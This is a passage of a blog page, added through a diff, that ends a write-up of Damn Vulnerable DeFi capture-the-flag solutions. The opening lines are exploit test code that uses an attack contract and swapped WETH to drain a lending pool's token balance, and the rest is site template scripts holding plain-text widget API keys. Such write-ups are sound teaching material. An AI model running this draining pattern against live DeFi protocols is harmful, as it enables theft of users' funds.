+        type: &#39;function&#39;,
+        inputs:[&#123;
+            type: &#39;address&#39;,
+            name: &#39;add&#39;
+        &#125;,&#123;
+            type: &#39;uint256&#39;,
+            name: &#39;amount&#39;
+        &#125;]
+    &#125;,[attacker.address,amount1]);
+    await this.AttackContract.giveToken(data2);
+    //把换出来的weth转给attacker
+
+    const amountRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+    //计算borrow所需weth
+    await this.weth.connect(attacker).approve(this.lendingPool.address,amountRequired);
+    console.log(amountRequired);
+    console.log(await this.weth.balanceOf(attacker.address));
+    await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+    //进行borrow
+
+&#125;);
+</code></pre></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">shaflow</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/02/25/Damn-valurable-defi-sotion/">http://example.com/2023/02/25/Damn-valurable-defi-sotion/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%A0%87%E7%AD%BE1/">标签1</a></div><div class="post_share"><div class="social-share" data-image="https://img0.baidu.com/it/u=471504868,3486654871&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=889&amp;h=500" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/11/26/Argument-Encoding/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2F2020-07-22%2F5f17fe80ceaae.jpg&amp;refer=http%3A%2F%2Fpic1.win4000.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=auto?sec=1672059006&amp;t=740baec47daa0a9f466c4033a1cc4e92" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">argument encoding</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2022/11/26/Argument-Encoding/" title="argument encoding"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2F2020-07-22%2F5f17fe80ceaae.jpg&refer=http%3A%2F%2Fpic1.win4000.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1672059006&t=740baec47daa0a9f466c4033a1cc4e92" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-26</div><div class="title">argument encoding</div></div></a></div><div><a href="/2022/11/26/proxy/" title="proxy"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2F2020-07-22%2F5f17fe80ceaae.jpg&refer=http%3A%2F%2Fpic1.win4000.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1672059006&t=740baec47daa0a9f466c4033a1cc4e92" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-26</div><div class="title">proxy</div></div></a></div><div><a href="/2022/11/26/knowledge/" title="知识点"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img0.baidu.com/it/u=471504868,3486654871&fm=253&fmt=auto&app=138&f=JPEG?w=889&h=500" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-26</div><div class="title">知识点</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img0.baidu.com/it/u=1478036750,1488409170&amp;fm=253&amp;fmt=auto&amp;app=120&amp;f=JPEG?w=800&amp;h=500" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">shaflow</div><div class="author-info__description">巴尔泽布</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/shaflow-fol"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xxxxx" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">欢迎来到我的博客！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#untoppable"><span class="toc-text">untoppable</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#naive-receiver"><span class="toc-text">naive-receiver</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Truster"><span class="toc-text">Truster(?)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#side-entrance"><span class="toc-text">side-entrance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#the-rewarder"><span class="toc-text">the rewarder</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#selfie"><span class="toc-text">selfie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#puppet"><span class="toc-text">puppet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#puppet-v2"><span class="toc-text">puppet-v2</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By shaflow</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script defer src="/js/light.js"></script><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="30" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_anzhiyu_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock_anzhiyu')
+    if(parent_div_git) {
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = '/';
+  var qweather_key = 'b16a1fa0e63c46a4b8f28abfb06ae3fe';
+  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
+  var baidu_ak_key = 'undefined';
+  var flag = 0;
+  var clock_rectangle = '113.34532,23.15624';
+  var clock_default_rectangle_enable = 'false';
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><script data-pjax>
+  function butterfly_footer_beautify_injector_config(){
+    var parent_div_git = document.getElementById('footer-wrap');
+    var item_html = '<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v6.2.0" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v4.3.1" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" data-title="本站采用多线部署，主线路托管于Vercel" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-Vercel-brightgreen?style=flat&amp;logo=Vercel" alt=""/></a><a class="github-badge" target="_blank" href="https://dashboard.4everland.org/" style="margin-inline:5px" data-title="本站采用多线部署，备用线路托管于4EVERLAND" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-4EVERLAND-22DDDD?style=flat&amp;logo=IPFS" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a></p>';
+    console.log('已挂载butterfly_footer_beautify')
+    parent_div_git.insertAdjacentHTML("beforeend",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_footer_beautify_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_footer_beautify_injector_config();
+  }
+  </script><script async src="https://www.fomal.cc/static/js/runtime.js"></script><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = '/';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '2s');
+    arr[i].setAttribute('data-wow-delay', '1s');
+    arr[i].setAttribute('data-wow-offset', '100');
+    arr[i].setAttribute('data-wow-iteration', '2');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><script data-pjax src="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.js"></script><script data-pjax>
+  function gitcalendar_injector_config(){
+      var parent_div_git = document.getElementById('gitZone');
+      var item_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><style>#git_container{min-height: 280px}@media screen and (max-width:650px) {#git_container{min-height: 0px}}</style><div id="git_loading" style="width:10%;height:100%;margin:0 auto;display: block;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animatetransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animatetransform></path></svg><style>#git_container{display: none;}</style></div><div id="git_container"></div></div>';
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+      console.log('已挂载gitcalendar')
+      }
+
+    if( document.getElementById('gitZone') && (location.pathname ==='/about/'|| '/about/' ==='all')){
+        gitcalendar_injector_config()
+        GitCalendarInit("https://gitcalendar.fomal.cc/api?shaflow-fol",['#d9e0df', '#c6e0dc', '#a8dcd4', '#9adcd2', '#89ded1', '#77e0d0', '#5fdecb', '#47dcc6', '#39dcc3', '#1fdabe', '#00dab9'],'shaflow-fol')
+    }
+  </script><!-- hexo injector body_end end --></body></html>
